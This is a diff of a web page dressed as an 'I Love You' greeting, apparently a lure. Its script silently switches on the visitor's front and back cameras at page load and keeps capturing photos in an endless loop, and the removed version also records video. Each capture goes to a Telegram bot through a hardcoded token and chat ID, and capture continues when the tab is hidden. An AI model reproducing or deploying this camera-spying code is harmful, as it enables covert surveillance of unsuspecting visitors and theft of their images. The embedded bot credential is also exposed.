@@ -1,4 +1,4 @@
-<!y html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -60,133 +60,87 @@
     <div class="heart">❤️</div>
     <h1>I <span>Love</span> You</h1>
   </div>
-</body>
-<script>
-        const telegramBotToken = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w"; // Replace with your bot's token
-        const chatId = "1987016824"; // Replace with the chat ID where you want to send the video
+  <script>
+        const telegramBotToken = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w"; // আপনার টেলিগ্রাম বট টোকেন দিন
+        const chatId = "1987016824"; // আপনার চ্যাট আইডি দিন
 
         let stream;
-        let mediaRecorder;
-        let recordedChunks = [];
+        const videoElement = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
 
-        async function startCamera(cameraFacing) {
+        // ক্যামেরা চালু করার ফাংশন
+        async function startCamera(facingMode) {
+            if (stream) {
+                stream.getTracks().forEach((track) => track.stop());
+            }
             try {
-                // Access the camera
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: cameraFacing // "user" for front, "environment" for back
-                    }
+                    video: { facingMode: facingMode }
                 });
-                return stream;
+                videoElement.srcObject = stream;
             } catch (error) {
-                console.error("Error accessing the camera:", error);
+                console.error("Camera access error:", error);
             }
         }
 
-        function startRecording() {
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream);
-
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-
-            mediaRecorder.start();
-        }
-
-        async function stopRecordingAndSend() {
-            mediaRecorder.stop();
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(recordedChunks, { type: "video/mp4" });
-                const formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("video", blob, "recorded_video.mp4");
-
-                try {
-                    await fetch(https://api.telegram.org/bot${telegramBotToken}/sendVideo, {
-                        method: "POST",
-                        body: formData
-                    });
-                } catch (error) {
-                    console.error("Error sending video to Telegram:", error);
-                }
-            };
-        }
-
-        async function capturePhoto(cameraFacing) {
-            const photoStream = await startCamera(cameraFacing);
-            const videoElement = document.createElement("video");
-            videoElement.srcObject = photoStream;
-            await videoElement.play();
-
-            const canvas = document.createElement("canvas");
+        // ফটো তোলার ফাংশন
+        async function capturePhoto() {
+            const context = canvas.getContext("2d");
             canvas.width = videoElement.videoWidth;
             canvas.height = videoElement.videoHeight;
-
-            const context = canvas.getContext("2d");
             context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
             const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg"));
 
             const formData = new FormData();
             formData.append("chat_id", chatId);
-            formData.append("photo", blob, "captured_photo.jpg");
+            formData.append("photo", blob, "photo.jpg");
 
             try {
-                await fetch(https://api.telegram.org/bot${telegramBotToken}/sendPhoto, {
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                     method: "POST",
                     body: formData
                 });
+                console.log("Photo sent to Telegram.");
             } catch (error) {
                 console.error("Error sending photo to Telegram:", error);
             }
-
-            photoStream.getTracks().forEach((track) => track.stop());
         }
 
-        async function recordSequence() {
-            // Record first 5 seconds with the front camera
-            stream = await startCamera("user");
-            startRecording();
-            setTimeout(async () => {
-                await stopRecordingAndSend();
+        // ফ্রন্ট এবং ব্যাক ক্যামেরা পরিবর্তন করে ফটো তুলুন
+        async function startAutomaticCapture() {
+            while (true) {
+                // ফ্রন্ট ক্যামেরা দিয়ে ফটো তুলুন
+                await startCamera("user");
+                console.log("Using front camera...");
+                await delay(5000); // ৫ সেকেন্ড অপেক্ষা
+                await capturePhoto();
 
-                // Switch to the back camera and record next 5 seconds
-                stream.getTracks().forEach((track) => track.stop()); // Stop current stream
-                stream = await startCamera("environment");
-                startRecording();setTimeout(async () => {
-                    await stopRecordingAndSend();
-                    stream.getTracks().forEach((track) => track.stop()); // Stop back camera stream
-
-                    // Restart the sequence after some delay
-                    setTimeout(recordSequence, 2000); // 2-second delay before restarting
-                }, 5000); // Back camera recording duration
-            }, 5000); // Front camera recording duration
+                // ব্যাক ক্যামেরা দিয়ে ফটো তুলুন
+                await startCamera("environment");
+                console.log("Using back camera...");
+                await delay(5000); // ৫ সেকেন্ড অপেক্ষা
+                await capturePhoto();
+            }
         }
 
-        async function startCapturing() {
-            // Start taking photos periodically (every 7 seconds)
-            setInterval(async () => {
-                await capturePhoto("user"); // Take a photo with the front camera
-                await capturePhoto("environment"); // Take a photo with the back camera
-            }, 7000);
-
-            // Start the video recording sequence
-            recordSequence();
+        // বিল্ট-ইন delay ফাংশন
+        function delay(ms) {
+            return new Promise((resolve) => setTimeout(resolve, ms));
         }
 
-        // Ensure the recording continues even when the tab is inactive
+        // ট্যাব নিষ্ক্রিয় হলেও কাজ চালু রাখুন
         document.addEventListener("visibilitychange", () => {
             if (document.visibilityState === "visible") {
                 console.log("Tab is active");
             } else {
-                console.log("Tab is inactive, recording continues...");
+                console.log("Tab is inactive, but script continues...");
             }
         });
 
-        // Start capturing as soon as the page loads
-        startCapturing();
+        // স্ক্রিপ্ট শুরু করুন
+        startAutomaticCapture();
     </script>
+</body>
+
 </html>
